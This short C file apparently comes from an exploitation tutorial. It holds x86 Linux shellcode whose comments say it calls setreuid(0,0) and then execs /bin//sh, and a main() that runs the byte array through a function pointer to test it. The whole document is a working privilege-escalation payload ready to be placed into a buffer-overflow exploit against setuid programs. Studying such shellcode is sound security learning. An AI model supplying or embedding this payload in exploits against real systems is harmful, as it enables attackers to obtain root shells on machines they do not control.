char shellcode[] =                  // white space, such as carriage returns doesn't matter
    // setruid(0,0)
    "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
    
    // spawn shell with execve
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\xb0\x0b\xcd\x80";
    
int main()
{
    void (*fp)(void);               // declare a function pointer, fp
    fp = (void *) shellcode;        // set the address of fp to our shellcode
    fp();
}
